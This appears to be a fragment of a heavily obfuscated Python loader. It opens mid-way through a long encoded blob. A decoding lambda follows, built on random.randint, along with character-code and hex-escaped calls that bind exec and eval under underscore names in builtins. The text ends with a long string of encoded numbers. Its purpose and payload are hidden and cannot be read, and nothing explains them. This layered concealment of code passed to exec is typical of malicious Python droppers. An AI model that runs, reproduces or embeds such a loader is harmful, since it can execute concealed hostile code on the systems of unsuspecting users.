v^KzT<)X*s6a058R-&GJ{RB)y_Aj7ZfxT-QFi-z4`1m$ZT)0|*eK=i~k%p7+HHy@B3HPldFc>Z_jzD*_8;cWui|-AltNY8(2um>rM1p5>qfj@Y&*kVqLAdg%pY&|&hm*8{ix0>IvyF?H$Wo>kV<@2L7vf#O+<YccUc4K|4v{Gn8@6Itdh`JF9BfLF5fEMx>!y?RJ5wz>NHtc4p`isQIE@fd;ovoL^;>Bhh%_7h2n8z&7Op`Wgh~zm-l5LTtQSZO%haysgxlvw<>(xz&({MnSuaMkaan~n?;2fC@jYR_omYro9*JDM<T<;yx5}*1!ef!^33X^AH9Ug;wG1!a<NY-9!dn9Fp={Kx0W^mXFfbt;<h$%Zc?zLrXjPpkXFp>Hrz^LGng>_L_s6pW@$q2cR|z)T5lft5GEau>3SQ+?EAz7Z3VZ;FxVE(^G}QHK>O<lv*pPm-ly?r5qnO7NrGC(<W|#`UgJa?>#=aTWLhp~Z30!`!)RmX&$nBwFHvK3{ICK+8O(X*3(-Yaigii^W9TIx((6lM9@FkYe0ohWY(+jCcbxadnDzF`J)P2vNkEi7{ggO&ogEJe;IHCvGk>~XgXl54^HsbrbJoXFo(OWmKaP6#h4O83ol5S`p%Etg)F7+`}{>A?#5!Hr_AxdJ(y%L3GqAA#LTQ!<^AE69b@o0Z|h<X=fKyVvEoRo}~rXM4^mxhmg41K=xe`GcGQLGb-
af}4O9!4;-t<!-X(Dfr?l8|*n&gM#Bb<TrIii7ms!#De)LLt3>U*wrKKO+%M6{>E@5cc&WE(@X%cq8p;D8Fd~j+Wy(pi71>fzcjNpSTamj;N&4g&VWFK^(o?g3O$dDK|ark$%yF(KN(;2;X4FePKVr7l|mq0Uebw+~LuP_i&diyP<D@QkQnE@_(%NW{Zsyi7q?A{$KQy3bg(@8SWSIfx`Kn&faLH+0ZoqmahG&2P7TKnK+)dZa<~~h*poKY3Z7`iFIuwnix~j2qm=dtmwb&s`zOrO1??p(aasKYBD6<(Jd9i6Ecn+O>>@Naq??wTdddIB*tMA&0+{J-#<S;N0BYns3p6Ur6kV$iTC~ya^%ROob4`eyHXaz`2UI{cxZl)E?xhnVAA5T=-;>ip^kr`__61d&lcW)mG?B)+fpg!A}~j$z*$aWiPu|7iVZ8IR<otp5Wo89hgZnz_^(QU|1*Lj%UAJlMHLPZ!QvZQwr3-<DU|I?-lXhyduxVOVKKGRZXAFSs>PoTx~u~MM%AbUf6<%*kC)!1|7j8Hr3}_UVa!x`qBTd?%<(GY%4U#Qlqt1yeBHdI%dB;Fu3D`}=Rd$=7kX}i3FHp1(#uzCh;33f5_ZVQ<S7BwsHvU@vWfSc*qzs`-Qhe$WMD62{<kA?T8zJRoaF-BL6c|fgr=I}Ee${rMoxp;<CbQjn9j53n5zM*<YLpowaCly{;+%?s>E3qTypyY4Q&mX!jGCsBC1yebLOMfk}8#~B{Mu6Y{^Tjk3z)u<6@2pvW1e-h)?pd9Xr5vemBR-1EZUITS;i^m5udCAoztmXag9l7PZzDH=WZq*P3SUr8CT5F#-k02zZLSic3a98*Tl<q-VGeNC@7ZZ^}TE*Y2<uG)TW5xIb@oOu_?T?s_s)_&D;^ZI4y0GjN~Ixe-^&zK@m%+QqbjSh}&>Rq!76<B8t&ag^>!aLC2y=|zUjy_XX!6f767IMv-`Z3O}$j6{h@$)hjT@8m#>mKuj(dV~T8RH2eqH>nv;qo<)|^G3D3!O&}uhAYEqv5cCDS$%*eod)qo8Q5Z$CG`t&@WTGTS>1XPRl#UzKiIx`T2O)RJ6zg(*goWR6($k=-M+0!nH$c+^uyYN7CPw10PLS&dn6!?8ol~M0R3iyt!%5K*q}&Fv(vb&6T^-h?4GanIp?5~;tw$X&w7sGFh;zmyc8a!0@!c6+lD2u{A@k+Cgnzu1eCvcMdZ19tCRg*J3ZU`?YV^L-iAyUEB(0f-TZ${Jjvmk<5%}W`1Y0_X(aYKPIKC?HFmPFIG2_z`Z7K>rq{(5<5JlvzbyOO%%_Os_{<q0Nj*=&fUtci&d#L2i5-*kEwjFcWT&R=xh(qGC^p3J3tYoI<BsbE!ikV+kK)5+bW@K^R0i5eWHAYMQC~0XcxRqjkeU;zTg{-~)13LD(Fvx8OyCiBQ^nJZ|2So8B_A{r#f!y{TdN1ym_4J!-CK%D|2eP7tOrO4F?+s332^wL^U0a<eOXMu)2tW=t0&38!rn}Rz!{9wk^)h=<$E41q9j|m&uh43+)IOf0(L97s~EgM9UM4~<Cs1C*}Cst%M41F(g!z!sZlyri~fS?E}~3+UWbGl{bh4Q17o#K<}fd5GOkawT~}J}J<CXBr&+=%xm~K`pW@+i#oP7%nv0Y?Fe7TZ9;u~HMG`I>x@wpP)GyHKPW^?d9^&SI7<E(iR<_&zsyN?#CYnI%S@)20$rw&#3BLaKPVEFDb`Z-xTK`RNhfmp1DlV?n%PAk)HN;y3{Ml*|g)PFr;VM(zLx|SsPqWw6Ltk-bO^m{^)$JAFWK{oW7TJ|;R)0}T^;q^MwR1h!x8Jhv9YT~Y;qMwXc(unyT6AnXl=)enmsI!4YFN+M{_tvSG{k0b!hTc#tA{%o8yF3wBC#RxqDoU1L;V5$+5M<}>P<N9qWZ!d957xLDRr8{_BIA6P0<|c_jqCyHSV0kE(Xg}PXC{t194ju&wOjUX<MhD_4#KrU6jdr9c1%7fh2+li&pM1-RM2zqiCACWw5qp&*^q+JLGSNONz#ijtrp!u*ZiMai=}0nXtDwAVhV;1iiYWXr(VEUBcXF73?7zOiL7}3dfAuqt@%umJX!~Bu*Rk=$+3Btj}z7+s9Wwj3D<kilbUR@Lfa5Dt^J2-%R|X#TnR-Kl6pm2ym{aKG`~29NjsCU7rK@3;K3!kxnrb-tGQinUyYkAJHuAGX0uV!c!C+M?mPXa1bc_Gum2Bdv9ens!CgSF%NS(>P1ohr_X+m{qyOz@?osRH<0=rA)?|0J@DxYx3jcY1d3wYk}C%)?0xgp#^XUN@S}GulEqj#ssi9YS%m}BhUafa*MNYCs*5L5=JtFSr5oGyr0(+Qph08dN$yA2WjHjBWwS6pnZ<W|8<P%i=$Tq${M{yxtt`vBh(>>td}1BJ-7xP}eS!!GR7Ky@chG#=A^uZr2j_x~M3AwkL+XyYO~P>8o?J+DVVKL5gj&+iLx<UX?2Zzhd<<MUbz5dOW}(+~l%ceDr;OW<g|_=;r4k^%PMWK7GvXnr;`W|Z9D8i-Vf&9#rNx|E2qZpC{jD8~H}*|eZuy)o+gbtPf3ml#J8jSAZa%eNc|bM+EqYbhEJ-dA<JX1Mp_Xy-guTegIWE3>wqjC?&TEjJer(D?c@xjV{K6vPNQ%OZtuR0q>7nRbnHp<6SWnSKLLHgKg>mWFeECr^UoJ0d=FS}54zGnCr0yQfQ$ux?mAOU>p;?Lo;x?Aeo8a=l#<%&$AI|#)2VPzcb1CpY;Cy@IcV5`Xx{_3=`)#n-zxaFA!A9XOJ80l?+g_F{773{6k%{g~4zgP+lx=zmZ_4Xm_q#X8PIW<bT3!dm)lQrw5tpx_ZPq^{S4HB~k{tE$61`8ZCj}4mOGVV|y)_sNDl_q(YI2OHnybQ{x3-ifkYdz6um4(bhkC#%BqLe}Bra&5x%DMdla({Tf9QCH40W^rs{Y(%?rp}@|7H^zO=3Z5Ol}2cM8=sNGvMm{2J2Z<+zib~*4J2Z89*_%5L~z77in2dAlzrOWslx{ZKs0{y>Mf$j}RW`9WJ*06HVF!u&_AQyCN=4y&Z=b&S7b%*cNL^cn3Rz)!FTFH^%3iWE!if6OACShinYnTq)-j>RwMj60;Y{i)C%Kt4%FJA(DMgLms|=6qX!|XycS-SVJ;7mY>Ta_J#czU*Nxd7mdN?7_>S#Cinyj618-;{XXT}YwPi)e=pq|Fcj=-+ko7x-W+Iu2Q@myeLuC)uLmiwV2lpwP~!UENw~oN4#8krtgrrYdt5mYHI@z?GE{s9_uCh*NNDu_RD=9p*3w2Pf>=$dDeS6OhVQWeR>RYDeXNQ0#&7p5&l2_f2y=0F%|uMY+NTdtrcS@Cl9-KRH1*Z`Tl>7}gyn$OSGW(Wnp;B~%YK{61#$5%Lo|cp0TyzwP6-4m19>7)8PdFCMfSAn+e&}T;4(S2yPS<}%1O*{$v$A9Xp2|<!)A~C86AU(BdHq~X<Ao<X?^otVbqsHq5y(<+6sZ{+w~+=OPdH-LK`0E<36mwugYmmAvksb8gYey8C%R=l3cLE+GPjP4@oRmxxE5!R?9XO?zXu;*+fp*+5@#7H86i4O|8SvY^&t2sA0u-!cfnKA|%NA<^V4mCUq06fn+=$t>&5yi#&eu+|z-ia^o00&H$G_93%j|%w(UG37Y}Gx#^m=@;CKIr90E$!my~0G>a<${nRY;V#^U$6az7>#qV04;}M(E>TChEgxh*nQoo_&DeR!jf%83FS%sk+5a~oMD9=4a2k=HLQme7}9O)-`#Rut;la)G3v16A>EW<B>kW?S2>e{DxxWfg8OW4r^igSpi5ZS_&%SSS7&E3!hduYSbe~>{RCJVjHYinh+2<+%52!{`Cbu>!3v6A+!1o;NP*}3crRzu9kv{g%Je%TC!YAaWENb#2EcC5eTdr;~in;%#u5mMD0;<A#16j_DU>Gt*BcHiBUKR~Io5E^&opOx2K<%(K2Y3_|PEJw|ir;3)en;h)UX@+BTXLv?Of~K1W$EWCq!}aIyQff;&*eI6WFlFkumI06%mfi`PCFSb$u<$R_Sfp_IiYULhj1*oUF$?%FL6(_GB{9@vzdVy>o33%ixh51*i9trUs&<+k3Bb&qe1LI1-Q2n}vFI6_W55;#qe624Xc)|Z+bedGeHQ!3EAXz6%|D^Mp$lg7mD=3dvN@sElzI;x#{}M*rnAnE>IkYD77@-%pe!7tR3~!_U<NaB8+ei|+6^O4N?}1_al%;>TxnWvcMnrOm+KIoA<z1FPj7o7|CDQ<>Smy{nRE4nDqH*26M|J~CDfp8?lJB!faGv@mKda#mbEG<9q{>6%~O?241;(TpXbs^;Ge{VTx-2wq(#-TlbC)%iv*nky;K9-#>1&nMsF^yDny`?<qs!~MOmuO`p2RWYo0XFHKRE?GNGh_l8#Pmh-
qh8M0tjY3A>91n78yOOX9?J+(dl>g!~xDhTciXH5olIj;-(Ne)F?E9RGs_`8**kBUGl>!OAnW+pcBVjJBVkd>SEU*0ZQgm5Wy}2zbxnJ*EXcWzIC)H#mW=j~FFX<jTHYrxJJ#0Z7!zLYBGInK<3YZAlTT@k@~&!zuganJivRNFW6IwJj*GgkKwp<CYSkBV+wNXDFXQ!h-crfQ1#{K<>s%8h>?k*z8ZMSSZeQ`}ETjoR?GlufdUG-~szB8G|-3w-LbUC?k?=!zOhMm3#^0O%pn$`KQKeCPpM$K5WnbuK(>nQ#63IX(4mV&!nUKntpQ<&0gWBK1*S*#@nM!SSq<WX})N;=CCyxa5|$k@x0^U+#IbTq5;R%Hp&1(SRek$&y?m+_QWOnEfmJ2B8qju4nDOVc%n+^P&r-9HszPc)g8b^d0|vO9-upCT~xlF)q>Jy^y`injh3B_#bBzLIJ%s6!FEE@b_QvuJzF=y2c82l>}+=esl#Lqt_L;2TTfnLMD$o64eyb)yaWvDe8lutEx<E?6@t}j!;(W+4J=dp;!}4Y8ItcRxyt(3)Es9|4!%K>HQ$@BU9DzbhKJcNNOpzkSl_X)k_qAN0!Z9`mBB_>;_$*kTJ%yb#1p6I<wzNWPi4J7?;1e#i)Q^nvwi1|Z5~Bw7X!m*&fq3fQghkfm_0VZJy_r$teo@i5V)#JPfA2pu0qyF41tFy!4LQ%I&v)5)9=ZalpkUO=cX@I9xV?9DGN+G_DJPHB*Hq*%X;OgBru+A^wTEN1AAn=t{M={D`sRO{z!4<|9MHg=(UEE4+v2V7b>A3e-x?jEJkC{|0w^7HsSHIOw&f16}*`Jpj3m`tJgMv-GmszwnFWjnIlVjr)~P0J5^keXVN=Z9wP!!`FK9Fob?6+2VDZ{V*kB8uBeh$q;)Y#gncyz)?lwbgS<vf)-al!K>r(pS_2{6AvsOuB#1J((Y>-NA6izQ1xf_bm*225R{K4-!gz%D-F%#m%#5>~2MNYZ`a>cN|N9yLq2D!}!4zwF3fjI-^4Bl7Q$$Obk6E+EvmKwVZnzggq27m8Bt%wjSWQ|^1(jD#w6UZpb;j}_N!(yX=NfzRrI^6KTK%SoYtPW_FR~Nj-F83U-a%Pm>yY5etdJ-oc$aR_4AlNmaYXrM2lvHhfs6kr+(8L`oP(RZE>Vwg=p%ERnP9H~hq9kFmahZW&zh3vl~!H_-tDW{a|ZH#@20O3Chj6YW>NfjhkSB9LatbX<aAwp!x_<)DmLj3m+9<nUv{H$jEW$a($#h#7U*y~6&W~Y8ZyLR0l++|l=!V+kUGD5-+az;Bk)v?nX-41c>B;g@{G8}>2UA!*sRb=g#JO3?~&4T1#iHo>yaUc&qDhA@GaUr`<W<Hy6727_~?<4w#Bo)NUbwrfY=%dTYWm%;<-fxW1ZT<yvRLzui|~@w$MKSk#czw4tS2ms$4wnXHt`zxe>`Y8Nd@NsC<}uGn-JI?KG5QE2mBhf0eeY*>QEF{-t|*8I>Sa&CNYh`dP}w??O*|4izbW%jXceoSGJ9L%@WO1^(qrZ}ucvg)*W;?Af$D4AsNy`1O1<SV3p|P!;YkrC57rmPufztSyoCL<!0w?PqCEGvE$D_Xkr*@j+Ns&V7SFHJwnV3HhkS(=e4VkbkxaRig73RO4>}k=I&%ujP`XIBN@Fq2+(0ilSJdE^Q_Hj-ZP|kT)Pw+^DX<mA(mra+e^;4}kDVofMroDgN}!kAq3D=F$?cT_6$erC_tHyy~q}K4usvM~n|w+U0w05AN9H<5gP5X(gNznk;KPn)}0X%bzcsto*R>LpMPx7%KaY!d{1j?wZ;#R@%@_K?vdsaDwLGy#hBH`Gq_Iq4%*g@dnIgBh$fEaH><VZU;gQu3GM=R|$|_Az8D&WakHv?HO`s7Bc<5L6voEtJvj7;t*ChQ)Mwij^2W8Z4b}HZ{RaqGdbodEmnCz$90LNxy&+_ulVR|lvzUfC&RuJzw$1hstWNK`MDJ`L;}&SHlViM?xvOM`_bEi!UlgAH>O%fA7Rj+txxV0hUXJbZ%r7+IZ}>{ET`mA??pkCdbsLOzMFDk%EI>gTc?kcYi#lvJE5YEQ{R2_ThCzt7z2a*So~*xrx)`G5n)4g$NS=<ds(!{!NqCnCwxb1bFJ;$)6-d*`*EY6<~|&|=j~v*XqEr2C2mI+zh>hr<sP$9P442RHxl~uDgm;Ud?n_+W+VvmCnBhT%cO?z)2s9ewj<ZHu?>?h&JY6u19CCxA4_5N%R5?FG2M-@km?3abT_sm7xm6c1FL9c7zdB4%@zb_!Bb;ak(a9#`q=;`+|P)rz~{BMe7j0NG7lUQ4J)r(w4}LaX`M}HFP#pKC<`P*pq_1j=lCQFIK6W-AErB?oPL?i;TM1gI6GH_5%V{~KWT@28_F}~)zu}t?7^)~nafIUv$I4(YNgkc(&_H9vSxnI08bg1y@8m7YI~|wfO7JM9_5=VhAK_&CLD`UOE5hZnr?yezg{pxo9r}V0KV?Z9i}_Oo2`Qvj;U~G1zZHGOmH95{noP~C+#8?FeCob&^C5Q(Q8flu<OZN&9tKe%GavcAt_vQt1cL~x=s-SGeyDl259<d3+-6maR*rE4=P0POx0;XuUpNUe+u@yCp5Xg&V`<Q+2wE4Ou|a71W!M$zOJ@V$}x56fHJuE*_FJ7Y=C(kGAs%gf)6*RJ(nady|le)sr8>EAkfV2X5&_6-~_<xW83DJtek8vI7n%ewJ650I(&|1;d-zc<SI!~$ZFD764ORWaimTkv|z!O>2@RD0rP*B1da#{A%qr3vcR=+;(6d*N=js-wnsg!nQJcT2&iB(;d_|6x*-6C4FC}u<`;}3X}k$*1>NXWG~3ehGV|I9B~IZfxbTisb3i$?Q9S#YbEqaIx7%Q@#X4r4JbrX@RqK?N+&i?!qUaF_+x<@x)z~piSHn^=idiV!IT9^#(tGKQ>XsU=sS>2GD~zox{^m4{<s>xK=8No)Vzaj<?3`j*iN<+|atQq7^`Jxb95*<Zs?B{3G+>S6aT*(%pc?V`%u4`TdVi`7xpWaazFjjw#uZCA^Wtv>(RcheH>^Evp5z!E<>U?EZ>PJ4VG_~|kpaYX1044-Gg_XmT<hdJQ2JLGI6}awqLq6#W#l^(=-lL?J~`Oq;o^l9%JEPd;P^hC*?D_r?6VL80vf%bZuQZWp`zfaNw^a}oR?#nlABQa1b?t@9@q$>ehrmm^ADLxJXpQ<rU{UP{2<tq4=#xWlvXPsub9t(`lxx$!Z*%&R_~kM+Uvs$_E?-9&&;RCN3z$r5pP>t#5*7fo60@{3tD%2J1D%lF5QR2)=Ex#rEL=|uza^HNzZJwu||Vidok>6fT)QVq#>~%m6Ew<2*5rCr{z41fmLL)U9QrsNpC(VeNTUXYjcH5BU$nrSM&P_Q<2xKuw3XX{qNNW<#}lsHI~c=n)x8Wq(oB^>Ji~)v<H5PNn|b%dnn{vnLW6yE5pw}V-}}bj*3JUaV_>X=OoYZq@|iNtpvl8S--ul3k_ub4&i+p$RQk->8VmR7Uve+6Y8N4=)|%@Hx|r6R$ld~g`N_f3kq_sEZ8v!u0Yx00|3--T{d10&F(t|#Iw%Q>UE)p+xN+LJBycJ%r>G(iJ`sj@SeexXp^7gx|G+SW}#G+#lQyUGP;LBm(JGH6-ZTW8S24=nz@CN>CMl*OXyt<0hNiw6uJQpllSU&2=S&7V_PNU3$Z|5bQ;V^+N-9!GGySYK!UKK-`V>AF7gCDRM%nce>Rw^PDx&5n~I-5A#CJN)~FyTR*(}ffz05oiGVIw-l;PW#Ft)3bvsxXj9K_}Eel3V4}ixbu6Cqk(MbJdBH&}rw6!K*b}J*U3=&ZhN+{l{scVM0dg94G%;ghj#SJ!w3ST_&z_KTz7=`yUHH!{n@x+e{9OWYlgNfiqRP&H|I?_K|r9On2=T&f6E#}w+VMOvWMjwG&*B0Ge^0a$Q`Pm<HbK^lfC&~SpJI|C(|DF1GHa{T>*kLXI=r_d2{D<w9D1to6WIWVd%FXihMx2>@-H2n=LM*5ZAAF2LyW8l!ZI#HCc9|3BV2X!(f!bFiqx=sQ)`q^4GmPythIqL%d3<0L6DRHEqB<Gu8N18xGxXXOd<?6BKsmzEJ9v9&d%6^{-)=z03~(ZeEBGp9!Hc@P6K+)CB{0;(R;`$8`&C5wG))&#-+9;DPCG!N|2~_r2L%L~s&Wi=?;(4fsS)6{PW{w&#s=P6Sr*W_l?s;tFK@uu&<XoI&v#(E*rg6P^zi_yL@nFmw9U7+Dp1wAI)cH)apNN;qG)X3;$bAsj!C)Aur`DNDX}Hf^v>$+rWK=N8SM$<z1Et^OzFH=24?u?W74BjfVcO6+XjTq^-WW?ZOs(q{xL6lt48hYApCuZoNW<5wP1RAZb7;JQvg>lDdcUt#1Z<6`K19eN3LULE;HdGCkHaB`tu&aOR>27dTe%WamPr&QUXPN+~3{1HE5o)$v!awqLpB=8<xfgbX}x?kA8_w)^U6KRoe~L(K!F@mW<pQ=HLB-0Rt$_Dle|&#m--6*Th-jM8(rMK{C&>L*(!mf2!K1rQuay4=H-c>9Y3uNFqymqj11!h~^&r`Wh6K7&2%0^F~k;AdtXz1*<X`^XfaXgI%)!Kl*#N%Bofw#F-53X#K5p(~&!{y&2!CFYkG8^6{>+QD2&pQWq*aG+B`2Y<by_N7dBv2JE^BZ~)pht(_c+U1gEL`k%xNd2lmCyV+j!&ia~tmw10|!+Pc+oq64%o@EcNpmx#xdU(VJ#e1$n)$S;NhYrfu5mWA5r800YQ!(d|S7J66Mep@pfvl6x>);Ngyn>>)!*(puQ|c^zU*=Y!de^qVk{uZ#C_d?P_0JsGd(Sx7XNm4~7|kK11jM~Yk&xuVSS0+}nY>ZO^uxdEv{vI!EO&J#ubd*^g1A*j3fIuPB^X*<fuLw@h0G#iO<_(CciQ427(N>dmr-J42yu!P<ezVm*&3&Qn<rU?WRBhOHRHuD5s~C<LK-
tDi6u0gOh^g`RF<>OjHV(s%i+t9f|#@dfztgfLoziSM>maBd`0Cy6}AQ?&TKr~3sZ%zmCL#?R$nvzJ)9@Y9VoDz+2ya|I%`BWOFz{TXkZSmQ+_{FolvHD0bfQ(`AYY5K+)$6>)-*9SYx(6zYx1+yO&wEAriRNBjga^_V)x><y%0&dhKq~vJaHhytt1oO_C`8tvG0Oy3XnEhF>y>1YprGz|yhD;04TTy*b~59{ZH#PfYTll+kU6Z#!bS3hJBAsUyXv|NAapOYXu|R-9CRn_RHF;P1OcLKYf94+EE+8T?8UJz64K`hyaDe~yw50DpjR^<qlz+GE=-Kr(Y58plS=2q0avBp~=3Ro^v4zCwP=t;G)31r;3#MJpJc6)ade+6!xc%0-~VW_#jTQ_?*l;DKe|@f%W(6V0fri)Xe?{(N<LfJ^q-I6vEW{)dZ|cEjx%-Y1Sv%GdFBy1;A^GC&J$QyVUh{_&H?FRjUWe-E4tTnxo=Qk6?prI%D5fq$tuJ8%gxa{S8_4-et9f=vsb62_`4p{O88T5+oE)OezAAvs_K{V*;Ys~fnJUE`krjwQXZLAmOD%J8B^8H)J(dk=|9G*#it+Y^)|Tx9%w7`{4uuh;9)%IAvZpzBo~WG67faAl(m2LFq+?0LBPuJ4!z1VPV+{sB^L<bDd0^m}S3FWlahyB;7ZLdC<c`npI~;=VB4i7r-1&}hLaO2Lp3+I$+aFL1WNq2K$@cx;HU;v2@%R|{AxCeI@_!98QM>kF@L%zB<kvO}HU*fFhnxHjWz?m4YACl_Yv6~eC@jQr-;1bdX%Py$1*poTn2(F&U&%Ri~X6sY4`+S7Xx2t-sfI;kLY#JP`oM%ojM2Y=a^v*EP-&4Y&s{bv3!3$HIQ*IV^~e2{v2P_>t+&6f@Ef9%pY&`m4PsCR)Lk0pQ0S<68sD7Qx)iHf8FXd^a>@zVj?3@X}3eG33{IU`WnW>cXjzDr6b7q43^(X8rE%-8u8F8j1?dfaQ>)oXDW|0eo2DI=bZYcX)h{tZWbX>bCj&(T%$y4x|fXJoc(q%>t_lvqOJvweqrp{dIS^7q5pmwu-wB6C#bk`eyuTg=mP4Y{LXsofcuExQoDJlBOB_j^!sG`>iwtUv3EK*?*g%raCRuP{$7=}vrq_BhubZ#|7JU2^w~hWk1~D5#s2;zmHvbIx#5q8I?q?yAq=L11AN(ELylJjy3?UsqG|-M)pVUA4J;#aYLXHdPP1wKG-yoBFy*-Oc|JK_Asc4%pQ)G<G+T4x3>DcEQgTykI{;^9A@+_@uIvWnRq%sUn#Q*f&x|#ZY_NhtG4>$kdJhM-{2c$C14mBdB$S>7NPD(6LmrQ!p$|S9iR_x=wc;M&!3*g1EH?!(PN1*I{Z21q<teEweEyx_qh$X%N-%7Y2}4pR7m9zsDRu-^%^b>E<=3yfNtMYiv{gkGLLe;W92x|Goz)2yEpv8$%5dX(_X&=Xs4(={dAqx!{?T*hKIvQHAn%T_vgiUFu03=$k>5lp@*&1iI$g{3Sm!`=*T!L4D;dVVM;UuCu_dB|6;w?d<k=9Q`1gHFQO4&;{>?M|E8=2Q2X#Bp0N?0Znk|3N;LZ^mN}3*uXftSH_LOhWe_yLyVm+g`cqhGc0cBBPMtY_Y4A1bM7l|HM`PnaTi+N+Rc(xLf4W}7yZv7FY%6;lUH!6vJ0D~z_CN$IqxtJ*xy`UUDiSmudXlthv-UEd;;X)0VyXNdVKAh?<yWl$-^VamRPz|{`gjIF)96i97Abk`3k_SurXQT;SCk!EpDio)aK01nxp&YxG3xEfAUG7uCUq$j!tynRnK%&gU$A8&JjzL%w>3k#`-qb!KDu6YBwCZ7w{;f51@k_)3q%u=5XGvyhQ$(grepjQNIr~_p#O~0VhC=Tr-BbBzJf=^RHuc><Tkb=|DHw1&;B4I}YGqm3buLly?!p*}p{P9y&lGI(3OGWvDv-0$GU0gJ@6XWf=fU_cbH##x$i*jevgL66NUw*-W}iY$Dsg(OR+c=^IIhn!hol5aOO#kH$u1L~8a=LB>k;Nm*YN(sL*EM^70#G9?}7H+H(3q!j2?%i!huTI;X07$#Um51?p7u2R2}qrL`(uNv+H&ewS+*lWg>^%FW{5}La?^~G)ScaHedNqT^X#YP_tMM~*!AUnQgWXY5)PTIxxg599_$u}jdC=a)znX;@pFxv0W0oyfL1RLPC7wfbRBzGvr&6RjEP6|uR0x<LCoJ)NT!3fsm_y#q2#R(EAzzGFj^rCu*mebJO*GCoEoqbqBPY~?%i9AQM`A|&%8~6bVw<aA-8X+;^gxWE&Y83jg!p2;Lk_Y>v%jMS%AICjxDTYEJ_e_zo`?68Be-Z&wep{1!m(Jj>8%2OBDn79tID*c#T7hWA-*mxRv_1KH1X0Fre@lScJ<Fi6TbSfEjBggY16pJ%h*1=C0F#J>_tO{sxQ&_xLs<d8?V+r!{K<8Am+%!QPQ&)VK9N9gP^~!6lp?*gXy<TbjY68|F-;U`yZ|Ts*TTL#gX5nXeSbLFsd#3P|2Xstaf`utJAtYYW-e+HE!nxdnK1mk0`#0ir$vreo5-FiDe_5u@0^nUP77C!RakdYlr~tVZV16y$o3ENNok;mDRfC=t%Gb_oo3wG{^$=W=f^6b5VbRHR7P~Uw7Cr)5C3-xpAll%{Gqs>mORN*G8k=VrZ2f4^0+;GC3LhfNwqO}UD5Dla`a7D6qFw=>*n|WxL-U*5a;cq&NwUgv{<;M@R03o=M&wUyL#lbDL%&-9|OXZ{k;HUd?}5Tj#-m$lQZ2menxDA@@2spYu1Mwp|z^Q8}u^r7p3FebGs-0nwjvj(Ymdg5S!Od*SyN$AW?a|1UHa59Gi+V--1nlttiA~gh_4CI@j!Ik$|y>*_KHGlVzOs2T0S3RYQ7GttDA?$b-p5d6At}Zno^-?gtGN5mYQ(eXnkzG4oQ20~<X$)t-mMR%#|RIB;2oU?A^&rrAb<a{5ZtRW&ukSqyR!zp)O|-rwP3)d*!``TUy|Hz)O9TPZaoS{vH7Snza~)Zn_rM7&xc2<zh~q@ToyAJkq)wT7DB2|A!a6X0&#IEgpTF6vG$xv=YX);84>Y=9HH!dX3a{<TzRbmxPo)h5%U^R@Yj1Pg><jPLvGgT5W72G%Jm<u#kC{+eo~yf+vWy<bt50I*VA^jfUi?X!ktOoUXRPiv_88LC$PJ+%qKfigSYJyy_42w3S2zcG?P74cSAwQ8G~F8tV_1M&-M*&^UKWw%M;bz{d*HYS5X7#~{ytv?LQ=lXQ3Drs)%l%xJR>U1-Yo_2F|gFD1WjG0fh1i|$NX&fCgLLHS5mKAbI4<&{P!^IMC@TT6kz!+%@2GTXlJB%e!H>!c}_;$6ea@c%XrwQF25jja%48nK@bJ;o_(B82OSPx2(?ZQEWJ7XZB4-&1Ek5euuiJNAb<63i*Zx$Blq;HIKyP@EQ7|~`z@OU!W+>ffxZ|X42^sz4~n<_Ok(cDzXQrp=GejtYB0#NJ$GJ&$76WcG}8GIl1ww17ovU-X&EFzE@p>SC4>cja2%wc2W?P~9(?$@=%{xtfi@fBNI)8yb*AQJkUuLGW>d($*SsvTdOdZzN>5k<CP^48t{MGT{+n&kNGWZ6V0ca}@phM+XnD05>2b)=uxtmRe~w6!U7JaVD#Q8jIrs7-Ek-GhU#vWUS>v9`fwm)YVT#1E?|QSMzM4SBwYV2!;dK{(E>i_;4i<GiPmB<U~2T($2VLJWlGObgjgD*O4=_{q4f=tJGt&H*VQ7FxM!=rbaFeYXi|m~1x9A*Xkx`ImPnKxKBVl<wHH$pU~~)Z6)6aa-eZA&C;=H(i=dG)SL9*A>spEa!D3(%fP&{Yx`h#Ya-f+ackHGlH=MP+(>C*5oui@7l}so6GTV`7wA4wVuw!N_A)%9$aPTGKi(Zqq^(4W^++S8<sR3mdRbxaznhHT4do4x@NvarBQ+JM^dd>vN((U1C=7X3pV!4P{BZD^5-aa@0t=Pv#ah;PZ@kq&II5<O2Wq49CA5-myS+9hXc`>kZ9NyO3Z;#`cZojVX!#zvq!1l)Ng@ep4<hr$%=4oT_V;gYId8{<cu`|kcVLosX8Oyx+;`)m4CR}u^k0j-7(F2E$|g~4KIPYGh5ydYqcMkWQz)}yDn|GS$X5=N>VV$%N6_uny{+v$W0YD#bM86B?=&3UK7VcJ6XLoJ!mK'''.replace('\n','')]))

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 